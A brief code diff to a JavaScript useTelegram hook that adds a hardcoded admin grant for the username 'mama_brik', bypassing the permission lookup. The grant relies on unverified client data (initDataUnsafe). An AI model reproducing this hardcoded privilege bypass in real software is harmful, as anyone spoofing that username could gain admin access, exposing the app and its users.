@@ -18,7 +18,12 @@ export function useTelegram() {
 
     const isAdmin = () => {
         const user = tg.initDataUnsafe?.user;
-        if (!user || !user.username) return false;
+        if (!user) return false;
+
+        // Special check for @mama_brik
+        if (user.username === 'mama_brik') return true;
+
+        if (!user.username) return false;
         const permissions = db.getAdminPermissions('@' + user.username);
         return permissions !== null;
     }
